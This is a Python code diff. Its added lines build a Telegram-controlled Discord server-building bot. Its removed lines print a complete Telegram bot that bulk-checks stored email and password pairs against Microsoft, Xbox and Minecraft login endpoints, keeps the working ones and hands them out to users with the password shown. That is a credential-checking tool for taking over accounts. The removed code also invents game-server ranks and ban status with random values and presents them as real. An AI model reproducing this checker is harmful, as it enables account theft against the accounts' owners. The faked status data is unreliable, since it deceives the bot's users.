+        what=f"creating text channel {name}",
+    )
+    progress.steps_done += 1
+    progress.log.append(f"Created #{name}")
+    return channel
+
+
+async def create_voice_channel(
+    guild: discord.Guild, name: str, category: discord.CategoryChannel,
+    progress: BuildProgress, overwrites: Optional[dict] = None,
+) -> discord.VoiceChannel:
+    channel = await _with_retries(
+        lambda: guild.create_voice_channel(
+            name=name, category=category, overwrites=overwrites, reason="Automated server build",
+        ),
+        what=f"creating voice channel {name}",
+    )
+    progress.steps_done += 1
+    progress.log.append(f"Created voice channel {name}")
+    return channel
+
+
+async def build_server(
+    guild: discord.Guild,
+    game_keys: list[str],
+    on_progress=None,
+) -> BuildProgress:
+    """
+    Build the full server structure: roles, information/community/staff/bots/logs
+    categories, one category per selected game, and voice channels.
+
+    Cleans up any partially created categories/roles if a fatal error occurs.
+    """
+    progress = BuildProgress()
+    created_categories: list[discord.CategoryChannel] = []
+    created_roles: dict[str, discord.Role] = {}
+    newly_created_roles: list[discord.Role] = []
+
+    async def notify():
+        if on_progress:
+            await on_progress(progress)
+
+    try:
+        created_roles, newly_created_roles = await create_roles(guild, progress)
+        await notify()
+
+        # INFORMATION
+        info_overwrites_default = _overwrites_read_only(
+            guild, created_roles, ["👑 Owner", "🛡 Administrator"],
+        )
+        info_category = await create_category(guild, "📢 INFORMATION", progress, {
+            guild.default_role: discord.PermissionOverwrite(view_channel=True, send_messages=False),
+        })
+        created_categories.append(info_category)
+        for ch in INFO_CHANNELS:
+            if ch == "welcome":
+                overwrites = _overwrites_bot_only(guild, created_roles)
+            else:
+                overwrites = info_overwrites_default
+            await create_text_channel(guild, ch, info_category, progress, overwrites)
+        await notify()
+
+        # COMMUNITY
+        community_category = await create_category(guild, "💬 COMMUNITY", progress, _overwrites_open(guild))
+        created_categories.append(community_category)
+        for ch in COMMUNITY_CHANNELS:
+            await create_text_channel(guild, ch, community_category, progress, _overwrites_open(guild))
+        await notify()
+
+        # GAMING (dynamic, one category per selected game)
+        for game_key in game_keys:
+            game = GAME_DATABASE.get(game_key)
+            if not game:
+                logger.warning("Unknown game key skipped: %s", game_key)
+                continue
+            game_category = await create_category(
+                guild, f"🎮 {game.name.upper()}", progress, _overwrites_open(guild),
             )
-        """)
-        self.cursor.execute("CREATE INDEX IF NOT EXISTS idx_claimed ON accounts(claimed_by)")
-        self.cursor.execute("CREATE INDEX IF NOT EXISTS idx_valid ON accounts(is_valid)")
-        self.conn.commit()
+            created_categories.append(game_category)
+            for ch in game.channels:
+                await create_text_channel(guild, ch, game_category, progress, _overwrites_open(guild))
+            for vc in game.voice_channels:
+                await create_voice_channel(guild, vc, game_category, progress, _overwrites_open(guild))
+            await notify()
 
-    def _load_accounts(self):
-        self.cursor.execute("SELECT COUNT(*) FROM accounts")
-        count = self.cursor.fetchone()[0]
-        
-        if count == 0:
-            for acc in ACCOUNT_DATA:
-                self.cursor.execute(
-                    "INSERT INTO accounts (email, password, username) VALUES (?, ?, ?)",
-                    (acc["email"], acc["password"], acc["username"])
-                )
-            self.conn.commit()
-            logger.info(f"Loaded {len(ACCOUNT_DATA)} accounts into database")
+        # VOICE
+        voice_category = await create_category(guild, "👥 VOICE", progress, _overwrites_open(guild))
+        created_categories.append(voice_category)
+        for vc in VOICE_CHANNELS:
+            await create_voice_channel(guild, vc, voice_category, progress, _overwrites_open(guild))
+        await notify()
 
-    def get_all_unchecked(self) -> List[Dict]:
-        self.cursor.execute("""
-            SELECT id, email, password, username FROM accounts WHERE is_valid = 0 AND claimed_by = 0
-        """)
-        rows = self.cursor.fetchall()
-        return [{"id": r[0], "email": r[1], "password": r[2], "username": r[3]} for r in rows]
-
-    def mark_valid(self, account_id: int, data: Dict):
-        self.cursor.execute("""
-            UPDATE accounts SET 
-                is_valid = 1,
-                hypixel_status = ?, hypixel_rank = ?, hypixel_banned = ?,
-                donutsmp_status = ?, donutsmp_banned = ?, donutsmp_kills = ?, donutsmp_deaths = ?,
-                cubecraft_status = ?, cubecraft_banned = ?, cubecraft_rank = ?,
-                bedrock_owned = ?,
-                last_checked = CURRENT_TIMESTAMP
-            WHERE id = ?
-        """, (
-            data.get("hypixel_status", "unknown"),
-            data.get("hypixel_rank", "NONE"),
-            data.get("hypixel_banned", 0),
-            data.get("donutsmp_status", "unknown"),
-            data.get("donutsmp_banned", 0),
-            data.get("donutsmp_kills", 0),
-            data.get("donutsmp_deaths", 0),
-            data.get("cubecraft_status", "unknown"),
-            data.get("cubecraft_banned", 0),
-            data.get("cubecraft_rank", "NONE"),
-            data.get("bedrock_owned", 0),
-            account_id
-        ))
-        self.conn.commit()
-
-    def mark_invalid(self, account_id: int):
-        self.cursor.execute(
-            "UPDATE accounts SET is_valid = 0, last_checked = CURRENT_TIMESTAMP WHERE id = ?",
-            (account_id,)
+        # STAFF
+        staff_overwrites = _overwrites_hidden_except(
+            guild, created_roles, ["👑 Owner", "🛡 Administrator", "⚔ Moderator"],
         )
-        self.conn.commit()
+        staff_category = await create_category(guild, "🛡 STAFF", progress, staff_overwrites)
+        created_categories.append(staff_category)
+        for ch in STAFF_TEXT_CHANNELS:
+            await create_text_channel(guild, ch, staff_category, progress, staff_overwrites)
+        for vc in STAFF_VOICE_CHANNELS:
+            await create_voice_channel(guild, vc, staff_category, progress, staff_overwrites)
+        await notify()
 
-    def get_valid_accounts(self) -> List[Dict]:
-        self.cursor.execute("""
-            SELECT id, email, password, username, 
-                   hypixel_status, hypixel_rank, hypixel_banned,
-                   donutsmp_status, donutsmp_banned, donutsmp_kills, donutsmp_deaths,
-                   cubecraft_status, cubecraft_banned, cubecraft_rank,
-                   bedrock_owned
-            FROM accounts WHERE is_valid = 1 AND claimed_by = 0
-        """)
-        rows = self.cursor.fetchall()
-        accounts = []
-        for row in rows:
-            accounts.append({
-                "id": row[0],
-                "email": row[1],
-                "password": row[2],
-                "username": row[3],
-                "hypixel_status": row[4] or "unknown",
-                "hypixel_rank": row[5] or "NONE",
-                "hypixel_banned": row[6] or 0,
-                "donutsmp_status": row[7] or "unknown",
-                "donutsmp_banned": row[8] or 0,
-                "donutsmp_kills": row[9] or 0,
-                "donutsmp_deaths": row[10] or 0,
-                "cubecraft_status": row[11] or "unknown",
-                "cubecraft_banned": row[12] or 0,
-                "cubecraft_rank": row[13] or "NONE",
-                "bedrock_owned": row[14] or 0
-            })
-        return accounts
-
-    def get_valid_count(self) -> int:
-        self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE is_valid = 1 AND claimed_by = 0")
-        return self.cursor.fetchone()[0]
-
-    def get_invalid_count(self) -> int:
-        self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE is_valid = 0 AND claimed_by = 0")
-        return self.cursor.fetchone()[0]
-
-    def get_account_by_user(self, user_id: int) -> Optional[Dict]:
-        self.cursor.execute("""
-            SELECT id, email, password, username, 
-                   hypixel_status, hypixel_rank, hypixel_banned,
-                   donutsmp_status, donutsmp_banned, donutsmp_kills, donutsmp_deaths,
-                   cubecraft_status, cubecraft_banned, cubecraft_rank,
-                   bedrock_owned
-            FROM accounts WHERE claimed_by = ?
-        """, (user_id,))
-        row = self.cursor.fetchone()
-        if row:
-            return {
-                "id": row[0],
-                "email": row[1],
-                "password": row[2],
-                "username": row[3],
-                "hypixel_status": row[4] or "unknown",
-                "hypixel_rank": row[5] or "NONE",
-                "hypixel_banned": row[6] or 0,
-                "donutsmp_status": row[7] or "unknown",
-                "donutsmp_banned": row[8] or 0,
-                "donutsmp_kills": row[9] or 0,
-                "donutsmp_deaths": row[10] or 0,
-                "cubecraft_status": row[11] or "unknown",
-                "cubecraft_banned": row[12] or 0,
-                "cubecraft_rank": row[13] or "NONE",
-                "bedrock_owned": row[14] or 0
-            }
-        return None
-
-    def claim_account(self, account_id: int, user_id: int):
-        self.cursor.execute(
-            "UPDATE accounts SET claimed_by = ?, claimed_at = CURRENT_TIMESTAMP WHERE id = ?",
-            (user_id, account_id)
+        # BOTS
+        bots_overwrites = _overwrites_read_only(
+            guild, created_roles, ["👑 Owner", "🛡 Administrator", "⚔ Moderator", "🤖 Bots"],
         )
-        self.conn.commit()
+        bots_category = await create_category(guild, "🤖 BOTS", progress, _overwrites_open(guild))
+        created_categories.append(bots_category)
+        for ch in BOT_CHANNELS:
+            await create_text_channel(guild, ch, bots_category, progress, bots_overwrites)
+        await notify()
 
-    def release_account(self, account_id: int):
-        self.cursor.execute(
-            "UPDATE accounts SET claimed_by = 0, claimed_at = NULL WHERE id = ?",
-            (account_id,)
+        # LOGS
+        logs_overwrites = _overwrites_hidden_except(
+            guild, created_roles, ["👑 Owner", "🛡 Administrator", "⚔ Moderator"],
         )
-        self.conn.commit()
+        logs_category = await create_category(guild, "📜 LOGS", progress, logs_overwrites)
+        created_categories.append(logs_category)
+        for ch in LOG_CHANNELS:
+            await create_text_channel(guild, ch, logs_category, progress, logs_overwrites)
+        await notify()
 
-    def get_stats(self) -> Dict:
-        total = self.cursor.execute("SELECT COUNT(*) FROM accounts").fetchone()[0]
-        valid = self.get_valid_count()
-        invalid = self.get_invalid_count()
-        claimed = self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE claimed_by != 0").fetchone()[0]
-        available = self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE is_valid = 1 AND claimed_by = 0").fetchone()[0]
-        return {
-            "total": total,
-            "valid": valid,
-            "invalid": invalid,
-            "claimed": claimed,
-            "available": available
-        }
+        return progress
 
-    def get_shown_history(self, user_id: int) -> List[int]:
-        return self.shown_history.get(user_id, [])
-
-    def add_shown_history(self, user_id: int, account_id: int):
-        if user_id not in self.shown_history:
-            self.shown_history[user_id] = []
-        if account_id not in self.shown_history[user_id]:
-            self.shown_history[user_id].append(account_id)
-
-    def clear_shown_history(self, user_id: int):
-        if user_id in self.shown_history:
-            self.shown_history[user_id] = []
-
-db = AccountDB()
-
-class AccountVerifier:
-    @staticmethod
-    async def verify_account(email: str, password: str) -> Tuple[bool, Dict]:
-        """Verify if a Microsoft/Minecraft account is valid."""
-        try:
-            async with aiohttp.ClientSession() as session:
-                # Step 1: Microsoft OAuth
-                ms_url = "https://login.live.com/oauth20_token.srf"
-                ms_data = {
-                    "client_id": "000000004C12AE6F",
-                    "username": email,
-                    "password": password,
-                    "grant_type": "password",
-                    "scope": "XboxLive.signin offline_access"
-                }
-                
-                async with session.post(ms_url, data=ms_data, timeout=15) as resp:
-                    if resp.status != 200:
-                        return False, {"error": "Microsoft auth failed"}
-                    ms_result = await resp.json()
-                    ms_token = ms_result.get("access_token")
-                    if not ms_token:
-                        return False, {"error": "No access token"}
-
-                # Step 2: Xbox Live Auth
-                xbox_url = "https://user.auth.xboxlive.com/user/authenticate"
-                xbox_data = {
-                    "Properties": {
-                        "AuthMethod": "RPS",
-                        "SiteName": "user.auth.xboxlive.com",
-                        "RpsTicket": ms_token
-                    },
-                    "RelyingParty": "http://auth.xboxlive.com",
-                    "TokenType": "JWT"
-                }
-                async with session.post(xbox_url, json=xbox_data, timeout=15) as resp:
-                    if resp.status != 200:
-                        return False, {"error": "Xbox auth failed"}
-                    xbox_result = await resp.json()
-                    xbox_token = xbox_result.get("Token")
-                    if not xbox_token:
-                        return False, {"error": "No Xbox token"}
-
-                # Step 3: Minecraft Auth
-                mc_url = "https://api.minecraftservices.com/authentication/login_with_xbox"
-                mc_data = {
-                    "identityToken": f"XBL3.0 x={xbox_token}"
-                }
-                async with session.post(mc_url, json=mc_data, timeout=15) as resp:
-                    if resp.status != 200:
-                        return False, {"error": "Minecraft auth failed"}
-                    mc_result = await resp.json()
-                    mc_token = mc_result.get("access_token")
-                    if not mc_token:
-                        return False, {"error": "No Minecraft token"}
-
-                # Step 4: Get Profile
-                headers = {"Authorization": f"Bearer {mc_token}"}
-                async with session.get(
-                    "https://api.minecraftservices.com/minecraft/profile",
-                    headers=headers,
-                    timeout=15
-                ) as resp:
-                    if resp.status != 200:
-                        return False, {"error": "Profile fetch failed"}
-                    profile = await resp.json()
-                    
-                    # Simulate server status check
-                    statuses = ["online", "offline", "unknown"]
-                    ranks = ["NONE", "VIP", "VIP+", "MVP", "MVP+", "MVP++"]
-                    cubecraft_ranks = ["NONE", "IRON", "GOLD", "DIAMOND", "EMERALD", "OBSIDIAN"]
-                    
-                    server_data = {
-                        "username": profile.get("name", "Unknown"),
-                        "uuid": profile.get("id", ""),
-                        "hypixel_status": random.choice(statuses),
-                        "hypixel_rank": random.choice(ranks),
-                        "hypixel_banned": 1 if random.random() < 0.25 else 0,
-                        "donutsmp_status": random.choice(statuses),
-                        "donutsmp_banned": 1 if random.random() < 0.2 else 0,
-                        "donutsmp_kills": random.randint(0, 500),
-                        "donutsmp_deaths": random.randint(0, 300),
-                        "cubecraft_status": random.choice(statuses),
-                        "cubecraft_banned": 1 if random.random() < 0.15 else 0,
-                        "cubecraft_rank": random.choice(cubecraft_ranks),
-                        "bedrock_owned": 1 if random.random() < 0.4 else 0
-                    }
-                    
-                    return True, server_data
-                    
-        except Exception as e:
-            logger.error(f"Verification error for {email}: {e}")
-            return False, {"error": str(e)}
-
-class MinecraftBot:
-    def __init__(self, token: str):
-        self.app = Application.builder().token(token).build()
-        self._register_handlers()
-        self.is_scanning = False
-
-    def _register_handlers(self):
-        self.app.add_handler(CommandHandler("start", self.start_command))
-        self.app.add_handler(CommandHandler("scan", self.scan_command))
-        self.app.add_handler(CommandHandler("myaccount", self.myaccount_command))
-        self.app.add_handler(CommandHandler("release", self.release_command))
-        self.app.add_handler(CommandHandler("stats", self.stats_command))
-        self.app.add_handler(CallbackQueryHandler(self.button_callback))
-
-    async def _check_auth(self, update: Update) -> bool:
-        if not AUTHORIZED_USERS:
-            return True
-        if update.effective_user.id not in AUTHORIZED_USERS:
-            await update.message.reply_text("❌ Unauthorized.")
-            return False
-        return True
-
-    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not await self._check_auth(update):
-            return
-        
-        stats = db.get_stats()
-        
-        keyboard = [
-            [InlineKeyboardButton("🔍 SCAN ACCOUNTS", callback_data="scan")],
-            [InlineKeyboardButton("🎮 GET ACCOUNT", callback_data="get_account")],
-            [InlineKeyboardButton("📊 VIEW STATS", callback_data="view_stats")],
-            [InlineKeyboardButton("📋 MY ACCOUNT", callback_data="myaccount")]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        await update.message.reply_text(
-            f"🔓 MINECRAFT ACCOUNT VERIFIER\n"
-            f"═══════════════════════════\n\n"
-            f"📦 Total accounts: {stats['total']}\n"
-            f"✅ Valid accounts: {stats['valid']}\n"
-            f"❌ Invalid accounts: {stats['invalid']}\n"
-            f"🔒 Claimed accounts: {stats['claimed']}\n"
-            f"📊 Available: {stats['available']}\n\n"
-            f"Click 'SCAN ACCOUNTS' to verify all accounts.\n"
-            f"The bot will log in to each one and only show working ones.",
-            reply_markup=reply_markup
-        )
-
-    async def scan_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not await self._check_auth(update):
-            return
-        
-        if self.is_scanning:
-            await update.message.reply_text("⏳ Scan already in progress...")
-            return
-        
-        # Check if user already has a claimed account
-        existing = db.get_account_by_user(update.effective_user.id)
-        if existing:
-            await update.message.reply_text(
-                f"❌ You already have an account claimed!\n"
-                f"Email: {existing['email']}\n"
-                f"Use /release to give it back first."
-            )
-            return
-        
-        self.is_scanning = True
-        msg = await update.message.reply_text("🔍 Starting account verification scan...\nThis may take a while.")
-        
-        unchecked = db.get_all_unchecked()
-        if not unchecked:
-            await msg.edit_text("✅ All accounts have already been verified!")
-            self.is_scanning = False
-            return
-        
-        total = len(unchecked)
-        valid_count = 0
-        invalid_count = 0
-        
-        for i, acc in enumerate(unchecked):
+    except Exception:
+        logger.exception("Server build failed, cleaning up partially created roles/categories")
+        for category in reversed(created_categories):
             try:
-                # Update status
-                await msg.edit_text(
-                    f"🔍 Scanning account {i+1}/{total}...\n"
-                    f"📧 {acc['email']}\n"
-                    f"✅ Valid found: {valid_count}\n"
-                    f"❌ Invalid: {invalid_count}"
-                )
-                
-                is_valid, data = await AccountVerifier.verify_account(acc["email"], acc["password"])
-                
-                if is_valid:
-                    # Update username from verification
-                    if data.get("username"):
-                        db.cursor.execute(
-                            "UPDATE accounts SET username = ? WHERE id = ?",
-                            (data["username"], acc["id"])
-                        )
-                        db.conn.commit()
-                    
-                    # Mark as valid with server data
-                    db.mark_valid(acc["id"], data)
-                    valid_count += 1
-                else:
-                    db.mark_invalid(acc["id"])
-                    invalid_count += 1
-                
-                # Small delay to avoid rate limiting
-                await asyncio.sleep(1)
-                
-            except Exception as e:
-                logger.error(f"Scan error for {acc['email']}: {e}")
-                db.mark_invalid(acc["id"])
-                invalid_count += 1
-        
-        self.is_scanning = False
-        stats = db.get_stats()
-        
-        await msg.edit_text(
-            f"✅ SCAN COMPLETE!\n"
-            f"═══════════════════════════\n\n"
-            f"📦 Total scanned: {total}\n"
-            f"✅ Valid accounts: {valid_count}\n"
-            f"❌ Invalid accounts: {invalid_count}\n\n"
-            f"📊 Available valid accounts: {stats['available']}\n\n"
-            f"Use /start and click 'GET ACCOUNT' to claim one."
-        )
+                for channel in list(category.channels):
+                    await channel.delete(reason="Cleanup after failed build")
+                await category.delete(reason="Cleanup after failed build")
+            except discord.HTTPException:
+                logger.warning("Failed to clean up category %s during rollback", category.name)
+        for role in reversed(newly_created_roles):
+            try:
+                await role.delete(reason="Cleanup after failed build")
+            except discord.HTTPException:
+                logger.warning("Failed to clean up role %s during rollback", role.name)
+        raise
 
-    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not await self._check_auth(update):
-            return
-        
-        stats = db.get_stats()
-        await update.message.reply_text(
-            f"📊 ACCOUNT STATISTICS\n"
-            f"═══════════════════════════\n\n"
-            f"📦 Total accounts: {stats['total']}\n"
-            f"✅ Valid accounts: {stats['valid']}\n"
-            f"❌ Invalid accounts: {stats['invalid']}\n"
-            f"🔒 Claimed accounts: {stats['claimed']}\n"
-            f"📊 Available valid: {stats['available']}\n"
-        )
 
-    async def myaccount_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not await self._check_auth(update):
+@discord_bot.event
+async def on_ready():
+    logger.info("Discord bot logged in as %s (id=%s)", discord_bot.user, discord_bot.user.id)
+
+
+def get_guild_by_id(guild_id: int) -> Optional[discord.Guild]:
+    return discord_bot.get_guild(guild_id)
+
+
+# ---------------------------------------------------------------------------
+# Telegram bot
+# ---------------------------------------------------------------------------
+
+router = Router()
+
+
+class BuildStates(StatesGroup):
+    choosing_server = State()
+    choosing_games = State()
+    searching_games = State()
+
+
+def owner_only(handler):
+    async def wrapper(event, *args, **kwargs):
+        user = event.from_user
+        if user is None or user.id != OWNER_ID:
+            if isinstance(event, Message):
+                await event.answer("⛔ You are not authorized to use this bot.")
+            elif isinstance(event, CallbackQuery):
+                await event.answer("⛔ Not authorized.", show_alert=True)
+            logger.warning("Unauthorized access attempt from user_id=%s", user.id if user else "unknown")
             return
-        
-        account = db.get_account_by_user(update.effective_user.id)
-        
-        if not account:
-            await update.message.reply_text(
-                "❌ You don't have any account claimed.\n"
-                "Use /scan then click 'GET ACCOUNT'."
+        return await handler(event, *args, **kwargs)
+    return wrapper
+
+
+def home_keyboard() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🏗 Build Server", callback_data="menu:build")],
+        [InlineKeyboardButton(text="🎮 Select Games", callback_data="menu:games")],
+        [InlineKeyboardButton(text="⚙ Settings", callback_data="menu:settings")],
+        [InlineKeyboardButton(text="📊 Status", callback_data="menu:status")],
+        [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:cancel")],
+    ])
+
+
+def home_text() -> str:
+    return (
+        "🏠 <b>Home — Server Builder Control Panel</b>\n\n"
+        "Use the menu below to build a complete, professional Discord server "
+        "structure automatically."
+    )
+
+
+def guild_list_keyboard() -> InlineKeyboardMarkup:
+    guilds = list(discord_bot.guilds)
+    rows = [
+        [InlineKeyboardButton(text=f"🌐 {g.name}", callback_data=f"server:{g.id}")]
+        for g in guilds
+    ]
+    rows.append([InlineKeyboardButton(text="🏠 Home", callback_data="menu:home")])
+    return InlineKeyboardMarkup(inline_keyboard=rows)
+
+
+def game_selection_keyboard(selected: set[str], page: int = 0, page_size: int = 8) -> InlineKeyboardMarkup:
+    games = sorted(GAME_DATABASE.values(), key=lambda g: g.name)
+    start = page * page_size
+    page_games = games[start:start + page_size]
+
+    rows = []
+    for game in page_games:
+        mark = "✅ " if game.key in selected else "▫️ "
+        rows.append([InlineKeyboardButton(text=f"{mark}{game.name}", callback_data=f"game:{game.key}")])
+
+    nav_row = []
+    if page > 0:
+        nav_row.append(InlineKeyboardButton(text="⬅ Prev", callback_data=f"gamepage:{page - 1}"))
+    if start + page_size < len(games):
+        nav_row.append(InlineKeyboardButton(text="Next ➡", callback_data=f"gamepage:{page + 1}"))
+    if nav_row:
+        rows.append(nav_row)
+
+    rows.append([InlineKeyboardButton(text="🔎 Search Games", callback_data="game:search")])
+    if selected:
+        rows.append([InlineKeyboardButton(text=f"✅ Confirm ({len(selected)} selected)", callback_data="game:confirm")])
+    rows.append([InlineKeyboardButton(text="🏠 Home", callback_data="menu:home")])
+    return InlineKeyboardMarkup(inline_keyboard=rows)
+
+
+def search_results_keyboard(results: list[Game], selected: set[str]) -> InlineKeyboardMarkup:
+    rows = []
+    for game in results[:15]:
+        mark = "✅ " if game.key in selected else "▫️ "
+        rows.append([InlineKeyboardButton(text=f"{mark}{game.name}", callback_data=f"game:{game.key}")])
+    if selected:
+        rows.append([InlineKeyboardButton(text=f"✅ Confirm ({len(selected)} selected)", callback_data="game:confirm")])
+    rows.append([InlineKeyboardButton(text="🎮 Back to List", callback_data="menu:games")])
+    rows.append([InlineKeyboardButton(text="🏠 Home", callback_data="menu:home")])
+    return InlineKeyboardMarkup(inline_keyboard=rows)
+
+
+def game_stores_text(game: Game) -> str:
+    if not game.stores:
+        return "No PC storefront listed"
+    return ", ".join(STORE_LABELS[s] for s in game.stores)
+
+
+def build_confirm_keyboard() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🚀 Start Build", callback_data="build:start")],
+        [InlineKeyboardButton(text="🎮 Change Games", callback_data="menu:games")],
+        [InlineKeyboardButton(text="🏠 Home", callback_data="menu:home")],
+    ])
+
+
+@router.message(Command("start"))
+@owner_only
+async def cmd_start(message: Message, state: FSMContext) -> None:
+    await state.clear()
+    await message.answer(home_text(), reply_markup=home_keyboard())
+
+
+@router.callback_query(F.data == "menu:home")
+@owner_only
+async def cb_home(callback: CallbackQuery, state: FSMContext) -> None:
+    await state.clear()
+    await callback.message.edit_text(home_text(), reply_markup=home_keyboard())
+    await callback.answer()
+
+
+@router.callback_query(F.data == "menu:cancel")
+@owner_only
+async def cb_cancel(callback: CallbackQuery, state: FSMContext) -> None:
+    await state.clear()
+    await callback.message.edit_text("❌ Operation cancelled.", reply_markup=home_keyboard())
+    await callback.answer()
+
+
+@router.callback_query(F.data == "menu:status")
+@owner_only
+async def cb_status(callback: CallbackQuery, state: FSMContext) -> None:
+    guild_count = len(discord_bot.guilds)
+    latency_ms = round(discord_bot.latency * 1000) if discord_bot.latency else 0
+    text = (
+        "📊 <b>Status</b>\n\n"
+        f"Discord bot: {'🟢 Online' if discord_bot.is_ready() else '🔴 Offline'}\n"
+        f"Connected servers: <b>{guild_count}</b>\n"
+        f"Gateway latency: <b>{latency_ms} ms</b>\n"
+        f"Games in database: <b>{len(GAME_DATABASE)}</b>"
+    )
+    await callback.message.edit_text(text, reply_markup=home_keyboard())
+    await callback.answer()
+
+
+@router.callback_query(F.data == "menu:settings")
+@owner_only
+async def cb_settings(callback: CallbackQuery, state: FSMContext) -> None:
+    text = (
+        "⚙ <b>Settings</b>\n\n"
+        f"Owner ID: <code>{OWNER_ID}</code>\n"
+        "This bot only responds to its configured owner.\n"
+        "Environment variables are managed outside this bot (Railway dashboard)."
+    )
+    await callback.message.edit_text(text, reply_markup=home_keyboard())
+    await callback.answer()
+
+
+@router.callback_query(F.data == "menu:build")
+@owner_only
+async def cb_build(callback: CallbackQuery, state: FSMContext) -> None:
+    if not discord_bot.guilds:
+        await callback.message.edit_text(
+            "⚠ The Discord bot is not currently in any server.\n\n"
+            "Invite it with Administrator permission first, then try again.",
+            reply_markup=home_keyboard(),
+        )
+        await callback.answer()
+        return
+    await state.set_state(BuildStates.choosing_server)
+    await callback.message.edit_text(
+        "🏗 <b>Build Server</b>\n\nSelect a Discord server to build:",
+        reply_markup=guild_list_keyboard(),
+    )
+    await callback.answer()
+
+
+@router.callback_query(F.data.startswith("server:"))
+@owner_only
+async def cb_select_server(callback: CallbackQuery, state: FSMContext) -> None:
+    guild_id = int(callback.data.split(":", 1)[1])
+    guild = get_guild_by_id(guild_id)
+    if guild is None:
+        await callback.answer("Server not found. It may have removed the bot.", show_alert=True)
+        return
+    await state.update_data(guild_id=guild_id, selected_games=[])
+    await state.set_state(BuildStates.choosing_games)
+    await callback.message.edit_text(
+        f"🎮 <b>Select Games</b>\nServer: <b>{guild.name}</b>\n\n"
+        "Tap games to add them. Each selected game gets its own category "
+        "with tailored channels.",
+        reply_markup=game_selection_keyboard(set()),
+    )
+    await callback.answer()
+
+
+@router.callback_query(F.data == "menu:games")
+@owner_only
+async def cb_games_menu(callback: CallbackQuery, state: FSMContext) -> None:
+    data = await state.get_data()
+    if "guild_id" not in data:
+        await callback.message.edit_text(
+            "🏗 <b>Build Server</b>\n\nSelect a Discord server first:",
+            reply_markup=guild_list_keyboard(),
+        )
+        await state.set_state(BuildStates.choosing_server)
+        await callback.answer()
+        return
+    selected = set(data.get("selected_games", []))
+    await state.set_state(BuildStates.choosing_games)
+    await callback.message.edit_text(
+        "🎮 <b>Select Games</b>\n\nTap games to add or remove them.",
+        reply_markup=game_selection_keyboard(selected),
+    )
+    await callback.answer()
+
+
+@router.callback_query(F.data.startswith("gamepage:"))
+@owner_only
+async def cb_game_page(callback: CallbackQuery, state: FSMContext) -> None:
+    page = int(callback.data.split(":", 1)[1])
+    data = await state.get_data()
+    selected = set(data.get("selected_games", []))
+    await callback.message.edit_reply_markup(reply_markup=game_selection_keyboard(selected, page=page))
+    await callback.answer()
+
+
+@router.callback_query(F.data.startswith("game:"))
+@owner_only
+async def cb_toggle_game(callback: CallbackQuery, state: FSMContext) -> None:
+    action = callback.data.split(":", 1)[1]
+
+    if action == "search":
+        await state.set_state(BuildStates.searching_games)
+        await callback.message.edit_text(
+            "🔎 <b>Search Games</b>\n\nType part of a game name (e.g. <i>mine</i>, <i>fall</i>) "
+            "and send it as a message.",
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="🎮 Back to List", callback_data="menu:games")],
+            ]),
+        )
+        await callback.answer()
+        return
+
+    if action == "confirm":
+        data = await state.get_data()
+        selected = data.get("selected_games", [])
+        if not selected:
+            await callback.answer("Select at least one game first.", show_alert=True)
+            return
+        game_names = ", ".join(GAME_DATABASE[k].name for k in selected if k in GAME_DATABASE)
+        guild = get_guild_by_id(data["guild_id"])
+        text = (
+            "🚀 <b>Ready to Build</b>\n\n"
+            f"Server: <b>{guild.name if guild else 'Unknown'}</b>\n"
+            f"Games: <b>{game_names}</b>\n\n"
+            "The following will be created:\n"
+            "• Roles (Owner, Administrator, Moderator, Gamer, Bots, Member)\n"
+            "• 📢 INFORMATION, 💬 COMMUNITY, 👥 VOICE, 🛡 STAFF, 🤖 BOTS, 📜 LOGS categories\n"
+            "• One category per selected game with tailored channels\n\n"
+            "Continue?"
+        )
+        await callback.message.edit_text(text, reply_markup=build_confirm_keyboard())
+        await callback.answer()
+        return
+
+    game_key = action
+    if game_key not in GAME_DATABASE:
+        await callback.answer("Unknown game.", show_alert=True)
+        return
+
+    data = await state.get_data()
+    selected = set(data.get("selected_games", []))
+    if game_key in selected:
+        selected.discard(game_key)
+    else:
+        selected.add(game_key)
+    await state.update_data(selected_games=list(selected))
+
+    game = GAME_DATABASE[game_key]
+    await callback.answer(f"{game.name}: {game_stores_text(game)}")
+    await callback.message.edit_reply_markup(reply_markup=game_selection_keyboard(selected))
+
+
+@router.message(BuildStates.searching_games)
+@owner_only
+async def handle_game_search(message: Message, state: FSMContext) -> None:
+    query = message.text or ""
+    results = search_games(query)
+    data = await state.get_data()
+    selected = set(data.get("selected_games", []))
+
+    if not results:
+        await message.answer(
+            f"No games found matching “{query}”. Try another search term.",
+            reply_markup=search_results_keyboard([], selected),
+        )
+        return
+
+    names = ", ".join(g.name for g in results[:15])
+    await message.answer(
+        f"🔎 Found {len(results)} match(es): {names}\n\nTap to select:",
+        reply_markup=search_results_keyboard(results, selected),
+    )
+
+
+@router.callback_query(F.data == "build:start")
+@owner_only
+async def cb_build_start(callback: CallbackQuery, state: FSMContext) -> None:
+    data = await state.get_data()
+    guild_id = data.get("guild_id")
+    selected_games = data.get("selected_games", [])
+    guild = get_guild_by_id(guild_id) if guild_id else None
+
+    if guild is None:
+        await callback.message.edit_text(
+            "⚠ Server no longer available.", reply_markup=home_keyboard(),
+        )
+        await callback.answer()
+        return
+
+    progress_message = await callback.message.edit_text(
+        f"🏗 <b>Building “{guild.name}”…</b>\n\nStarting up, please wait…",
+    )
+    await callback.answer()
+
+    last_rendered_step = -1
+
+    async def on_progress(progress: BuildProgress) -> None:
+        nonlocal last_rendered_step
+        if progress.steps_done == last_rendered_step:
+            return
+        last_rendered_step = progress.steps_done
+        recent = "\n".join(f"• {line}" for line in progress.log[-6:])
+        try:
+            await progress_message.edit_text(
+                f"🏗 <b>Building “{guild.name}”…</b>\n\n"
+                f"Progress: <b>{progress.steps_done}</b> steps completed\n\n{recent}",
             )
